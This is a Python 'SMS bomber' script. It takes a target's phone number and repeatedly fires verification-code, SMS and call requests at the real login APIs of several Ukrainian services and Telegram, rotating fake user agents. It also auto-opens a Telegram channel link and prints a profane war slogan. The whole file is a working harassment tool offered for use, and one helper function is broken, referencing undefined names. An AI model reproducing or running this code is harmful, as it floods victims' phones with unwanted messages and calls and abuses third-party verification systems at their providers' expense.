        #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
import requests,fake_useragent,time,os,threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')
#---------------------------------------------------------------->
def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiodfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email
    phone_plus = "+" + number
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('''[blue]
 Русский военный корабль''' 
'''[yellow]   Иди нахуй''')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
os.system('termux-open-url https://t.me/davZnakomstva')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
console.print('[blue]Введіть номер телефону без + ')

number = console.input('[yellow]#телефонa>>> ')
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
run = int(console.input('[blue]Введіть кількість циклів (1-10):\n[yellow]...хай буде>>> '))
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
for _ in track(range(run)):
         headers = {"User-Agent": fake_useragent.UserAgent().random}
         try:#ok
                 requests.post("https://helsi.me/api/healthy/v2/accounts/call", json = {"phone": number})
                 print('(helsi.me дзвонить)')
         except:
                 print('Не отправлено (helsi.me)')
         time.sleep(20)
         try:#ok
                 requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json = {"number": number}, headers=headers)
                 print('vodafone sms')
         except:
                 print('Не отправлено (vodafone)')
         time.sleep(3)
         try:#ok
                 requests.post("https://pwa-api.eva.ua/api/user/send-code?storeCode=ua", json = {"phone": number}, headers=headers)
                 print('eva.ua sms')
         except:
                 print('Не отправлено (eva.ua)')
         time.sleep(3)
         try:#ok
                 requests.post("https://ucb.z.apteka24.ua/api/send/otp", json={'phone':number}, headers={'X-Requested-With':'XMLHttpRequest', 'link': '<https://ucb.z.apteka24.ua/api/docs.jsonld>; rel="http://www.w3.org/ns/hydra/core#apiDocumentation"', 'server': 'nginx/1.17.10', 'vary': 'Accept', 'x-content-type-options': 'nosniff', 'x-frame-options': 'deny', 'x-powered-by': 'PHP/7.4.21', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache, private', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('apteka24.ua')
         except:
                 print('Не отправлено (apteka24.ua)')
         time.sleep(3)
         try:#ok
                 requests.post("https://kazan-divan.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers)
                 print('kazan-divan.eatery.club')
         except:
                 print('Не доставлено (kazan-divan.eatery.club)')
         time.sleep(3)
         try:#ok
                 requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
                 print('telegram')
         except:
                 print('Не отправлено (telegram)')
         time.sleep(3)
         try:#ok
                 requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers)
                 print('citrus')
         except:
                 print('Не отправлено (citrus)')
         time.sleep(3)
         try:#ok
                 requests.post('https://clients.production.vidmind.com/vidmind-stb-ws/otp;jsessionid=6A5A58432B4DF77C96656767BF0A9968', json={"phoneNumber": number})
                 print('kyivstar.ua')
         except:
                 print('Не отправлено (kyivstar.ua)') 
         time.sleep(3)
         try:#ok
                 requests.post('https://api.telemed.care/oauth/verify_phone_number', json={"phone_number": number}, headers={'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
                 print('telemed.care')
         except:
                 print('Не доставлено (telemed.care)')
                 time.sleep(3)
         try:#ok
                 requests.post('https://rider.uklon.com.ua/api/v1/phone/send-code', json={'username':'+' + number}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'})
                 print('Відправлено(uklon.com.ua)')
         except:
                 print('Не отправлено (uklon.com.ua)')